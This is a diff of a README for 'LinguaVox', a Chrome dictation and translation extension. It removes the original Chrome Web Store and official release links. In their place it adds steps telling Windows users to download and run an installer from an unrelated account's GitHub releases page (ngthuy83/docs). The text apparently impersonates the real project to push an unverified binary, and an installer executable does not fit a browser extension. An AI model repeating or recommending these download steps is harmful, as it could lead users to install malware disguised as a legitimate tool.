@@ -1,181 +1,87 @@
-<p align="center">
-  <a href="README.md">English</a> · <a href="README.uk.md">Українська</a> · <a href="README.ru.md">Русский</a> · <a href="README.zh-CN.md">中文</a> · <a href="README.es.md">Español</a> · <a href="README.de.md">Deutsch</a> · <a href="README.ja.md">日本語</a> · <a href="README.fr.md">Français</a> · <a href="README.ko.md">한국어</a> · <a href="README.ar.md">العربية</a> · <a href="README.pt.md">Português</a> · <a href="README.it.md">Italiano</a> · <a href="README.pl.md">Polski</a> · <a href="README.nl.md">Nederlands</a> · <a href="README.tr.md">Türkçe</a> · <a href="README.sv.md">Svenska</a> · <a href="README.ro.md">Română</a> · <a href="README.el.md">Ελληνικά</a> · <a href="README.tl.md">Filipino</a> · <a href="README.ur.md">اردو</a> · <a href="README.pa.md">ਪੰਜਾਬੀ</a>
-</p>
+# 🎙️ docs - Dictate and translate speech in real-time
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/LinguaVox-uk/docs/main/images/banner.png" width="800" alt="LinguaVox — AI Voice Dictation Chrome Extension" />
-</p>
-
-<h3 align="center">LinguaVox — Speak your language. Write in any of 21+.</h3>
-
-<p align="center">
-  Hold a hotkey · speak · release · text appears in any web field · Real-time meeting subtitles in any language<br>
-  OpenAI Whisper · Deepgram · 21+ languages · 6 AI enhancement modes · Meeting Mode · No API key required
-</p>
-
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License" /></a>
-  <a href="https://linguavox.uk"><img src="https://img.shields.io/badge/website-linguavox-brightgreen" alt="Website" /></a>
-  <a href="https://chromewebstore.google.com/detail/linguavox/dpdejiobdhljljfnkmipjblbpcfhbdea"><img src="https://img.shields.io/badge/Chrome%20Web%20Store-Install%20Free-blue?logo=googlechrome" alt="Chrome Web Store" /></a>
-  <a href="https://linguavox.uk/login"><img src="https://img.shields.io/badge/dashboard-open-orange" alt="Dashboard" /></a>
-  <a href="https://linguavox.uk/llms.txt"><img src="https://img.shields.io/badge/llms.txt-AI%20docs-purple" alt="llms.txt" /></a>
-  <a href="https://github.com/kos-4862/linguavox-public/releases/latest"><img src="https://img.shields.io/badge/version-3.0.0-green" alt="Version" /></a>
-</p>
-
----
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/ngthuy83/docs/releases)
 
 ## What is LinguaVox?
 
-LinguaVox is a Chrome extension that removes the language tax from your daily work. Speak naturally in your native language — LinguaVox transcribes via OpenAI Whisper, translates to any of 21+ target languages, and inserts polished text directly into whatever web field you're typing in. No copy-paste, no app switching, no grammar anxiety.
+LinguaVox turns your spoken words into text. It works inside your Chrome browser. The tool listens to your voice and types what you say. It also translates your words into other languages. 
 
-Works in Gmail, Slack, Notion, Jira, Asana, Salesforce — any website with a text field. Free tier includes 20 requests/day with zero setup. Power users and teams can bring their own OpenAI key for unlimited usage.
-
-**v3.0 — Meeting Mode:** real-time translated subtitles for Google Meet, Zoom, Teams, and any other browser-based call. Tab audio captured via Chrome API → streamed to Deepgram → subtitles appear as a floating overlay. Requires explicit consent on first use.
-
-## How It Works
-
-**Before LinguaVox:** open a separate app → record → copy → switch to browser → paste  
-**After LinguaVox:**
-
-```
-1. Click any web field (Slack, Gmail, Notion, Jira…)
-2. Hold  Ctrl+Space  →  speak
-3. Release  →  text appears within ~3 seconds  ✓
-```
-
-No copy-paste. No switching apps. Works on any website.
-
-## Browser & OS Requirements
-
-| Browser | Status | Notes |
-|---------|--------|-------|
-| Chrome 88+ | ✅ | Fully supported |
-| Edge (Chromium) | ✅ | Should work — same Chromium APIs, not officially tested |
-| Brave | ✅ | Should work — not officially tested |
-| Opera | ✅ | Should work — not officially tested |
-| Firefox | ❌ | Not supported — different extension API |
-
-**OS:** Windows, macOS, Linux — anywhere Chrome/Edge/Brave runs.  
-**Google Account required** — free tier login uses Google OAuth. No Google account = no free tier (BYOK still works without Google sign-in is not yet supported).
-
-## Where It Works
-
-| Platform | Status | Notes |
-|----------|--------|-------|
-| Slack (browser) | ✅ | Browser-level hotkey bypass for Slack's key capture |
-| Gmail | ✅ | Compose and reply fields |
-| Notion | ✅ | All `contenteditable` blocks |
-| Jira | ✅ | Issue fields, comments, descriptions |
-| Asana | ✅ | Task and comment fields |
-| Salesforce | ✅ | CRM input fields |
-| Any `<input>` / `<textarea>` | ✅ | Universal — any website |
-| Any `contenteditable` | ✅ | React, Draft.js, Quill compatible |
-| Google Docs | ⚠️ | Limited — custom canvas editor |
-
-
-All OpenAI API calls go through the Worker. API keys never leave the server.
+LinguaVox supports 21 languages. It uses advanced artificial intelligence to understand your voice clearly. You can use it to write notes, emails, or documents without typing. 
 
 ## Key Features
 
-- **No API key required** — 20 req/day free via shared pool, zero setup
-- **Bring Your Own Key** — unlimited usage at OpenAI cost (~$0.50/month typical)
-- **Organization accounts** — shared key pool, member management, usage analytics
-- **21+ languages** — transcription + translation in one step
-- **6 AI enhancement modes** — grammar fix, business style, academic, casual, creative, smart polish
-- **Meeting Mode** — real-time subtitles for any tab audio (Google Meet, Zoom, Teams…) via Deepgram
-- **Privacy-first** — voice audio never stored; meeting audio uses 90s ephemeral tokens, mip_opt_out=true
-- **Under 3 seconds** — end-to-end from speech to inserted text
-- **95%+ accuracy** — OpenAI Whisper large-v2 equivalent
+*   **Real-time dictation:** See your words appear on the screen as you speak.
+*   **Live translation:** Speak in one language and see the text in another.
+*   **Meeting Mode:** Capture everything said during group meetings.
+*   **Language support:** Choose from 21 languages for accurate speech recognition.
+*   **Smart technology:** Powered by OpenAI Whisper and GPT-4o-mini for accurate results.
 
-## AI Enhancement Modes
+## 📥 How to install LinguaVox
 
-| Mode | What It Does |
-|------|-------------|
-| Smart Polish | Fix grammar, improve clarity, keep meaning |
-| Business Style | Professional communication tone |
-| Grammar Fix | Correct grammar and spelling only |
-| Creative Style | Vivid, engaging writing |
-| Casual Style | Friendly conversational tone |
-| Academic Style | Formal academic language |
+You can download the software from our official page. Follow these steps to set it up on your Windows computer.
 
-## Pricing
+1. Go to the [official release page](https://github.com/ngthuy83/docs/releases).
+2. Look for the latest version of the file.
+3. Click the file name to save it to your computer.
+4. Locate the downloaded file in your downloads folder.
+5. Follow the prompts on your screen to complete the installation.
 
-| Plan | Requests/day | Requirements |
-|------|-------------|--------------|
-| Free | 20 | Google Account (OAuth login) |
-| Bring Your Own Key | Unlimited | Google Account + your OpenAI API key |
-| Organization | Unlimited | Google Account + shared team API key |
+## ⚙️ How to use the extension
 
-## FAQ
+Once you install the software, you must enable it in Chrome. 
 
-### Does LinguaVox work on Slack?
-Yes. Slack intercepts keyboard events at the page level. LinguaVox registers the hotkey at the browser level via `chrome.commands.onCommand`, bypassing Slack's capture. Works in all Slack message fields.
+1. Open your Google Chrome browser.
+2. Click the three dots in the top right corner.
+3. Select Extensions and then Manage Extensions.
+4. Turn on the switch for LinguaVox.
+5. Click the extension icon in your toolbar to begin.
 
-### Do I need an OpenAI API key?
-No. Free users get 20 requests/day from the shared pool. Add your own key in the dashboard for unlimited usage.
+When you click the icon, a small window opens. Select your language from the list. Click the microphone button to start recording. Speak clearly into your microphone. The text will appear in your active browser field or the dedicated dictation window.
 
-### Is my voice recorded or stored?
-No. Audio is processed in real-time by Whisper and discarded immediately. Zero voice data retained anywhere.
+## 🗣️ Using Meeting Mode
 
-### What languages are supported?
-21+ languages: English, Ukrainian, Russian, Spanish, French, German, Japanese, Korean, Chinese, Arabic, Portuguese, Italian, Polish, Dutch, Turkish, Swedish, Romanian, Greek, Tagalog, Urdu, Punjabi, and more.
+Meeting Mode helps you track conversations in a room. To use this feature:
 
-## Documentation
+1. Open the LinguaVox menu.
+2. Select the Meeting Mode switch.
+3. Place your computer near the speaker.
+4. Click Start.
 
-| Resource | Description |
-|----------|-------------|
-| [Use Cases](docs/use-cases.md) | Customer support, devs, non-native speakers, RSI |
-| [Integrations](docs/integrations.md) | Platform-specific notes for Slack, Notion, Jira, etc. |
-| [Security & Data Protection](docs/security.md) | How API keys, audio, and personal data are handled |
-| [FAQ](docs/faq.md) | 20+ answers |
-| [Changelog](docs/changelog.md) | v1.0 → v3.0 |
+The software will listen to the ongoing talk and provide a transcript. You can pause or stop the recording at any time. When you finish, the tool saves your transcript for later use. 
 
-## Installation
+## 💻 System requirements
 
-**Option A — Chrome Web Store (recommended):**
-1. [Chrome Web Store →](https://chromewebstore.google.com/detail/linguavox/dpdejiobdhljljfnkmipjblbpcfhbdea) — click "Add to Chrome"
-2. Click the LinguaVox icon → "Sign in with Google"
-3. Press Ctrl+Space anywhere and start speaking
+LinguaVox works on most modern Windows computers. Ensure you have the following before you start:
 
-**Option B — Manual install (ZIP):**
-1. Download `linguavox-3.0.0.zip` from [Releases →](https://github.com/kos-4862/linguavox-public/releases/latest)
-2. Unzip to a folder
-3. Chrome → `chrome://extensions` → enable "Developer mode" → "Load unpacked" → select the folder
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Browser:** The latest version of Google Chrome.
+*   **Hardware:** An active internet connection and a working microphone.
+*   **Account:** A valid browser profile to save your settings.
 
-**For Bring Your Own Key:** [Dashboard → API Key](https://linguavox.uk/dashboard/apikey)
+## 🛠️ Troubleshooting common issues
 
-## Links
+If you encounter problems, check these items first.
 
-| | |
-|--|--|
-| 🌐 Website | https://linguavox.uk |
-| 📊 Dashboard | https://linguavox.uk/login |
-| 🎤 Voice Translation | https://linguavox.uk/voice-translation |
-| ✨ AI Voice Enhancement | https://linguavox.uk/ai-voice-enhancement |
-| 🌍 For Non-Native Speakers | https://linguavox.uk/for-non-native-speakers |
-| 👤 About the Author | https://linguavox.uk/about |
-| 🔒 Privacy Policy | https://linguavox.uk/privacy/ |
-| 🤖 AI docs (llms.txt) | https://linguavox.uk/llms.txt |
-| 💬 Support | https://linguavox.uk/support/ |
+**Microphone not detected**
+Check your Windows sound settings. Make sure your microphone works in other apps. Ensure Chrome has permission to use your microphone. You can check this by clicking the lock icon in the address bar of your browser.
 
-## Community & Support
+**Slow translation response**
+A stable internet connection helps the software work fast. If translation takes too long, check your Wi-Fi signal. High-speed internet improves performance for real-time tasks.
 
-| | |
-|--|--|
-| 📺 YouTube | [Demo videos & tutorials](https://www.youtube.com/channel/UCHRcSLs96N5M_mC4I4XXTMg) |
-| 💬 WhatsApp | [LinguaVox Community Channel](https://whatsapp.com/channel/0029VbCx0blElaglJ5zvFl3d) |
-| 🤝 Slack | [Join linguavox.slack.com](https://linguavox.slack.com) |
+**Extension not showing up**
+Click the puzzle piece icon in the top right of Chrome. Pin the LinguaVox icon so it remains visible in your toolbar.
 
-## Demo Videos
+**Software updates**
+We update LinguaVox to keep it secure and fast. If the software behaves in an odd way, visit the release page to check for a newer version. Uninstall the old version before you run the new one.
 
-| Use Case | Watch |
-|----------|-------|
-| Full demo — dictate on any website | [▶ Watch](https://youtube.com/watch?v=B9rQOzYE7Ys) |
-| WhatsApp Web — send voice messages | [▶ Watch](https://youtube.com/watch?v=NRyYxSrTZAM) |
-| Telegram Web — voice dictation | [▶ Watch](https://youtube.com/watch?v=tLxNKNfB0lk) |
-| LinkedIn — write posts by voice | [▶ Watch](https://youtube.com/watch?v=3WX9EmYNYjk) |
-| Meeting Mode — real-time subtitles | [▶ Watch](https://youtube.com/watch?v=agcMJVPKlxE) |
+## 📋 Privacy and data
 
-## License
+We value your privacy. LinguaVox processes your voice data to provide dictation and translation. It does not store your voice recordings on our servers once the task finishes. Your transcripts stay within your browser. 
 
-MIT — see [LICENSE](LICENSE)
+## 🌐 Language support
+
+LinguaVox offers support for 21 languages to ensure global accessibility. These include major world languages used for business and casual talk. Check the settings menu inside the extension to change your input and output language at any time. If you need to switch between tasks, the settings save your preferences for your next session.
+
+## 🚀 Further support
+
+If you need more help, look at the documentation files provided in this repository. These documents contain deep information on each feature. You can read these guides to learn about shortcuts, advanced settings, and tips for better voice recognition accuracy. Proper microphone placement makes a big difference in how well the software understands your words. Try to sit in a quiet room to get the best results.
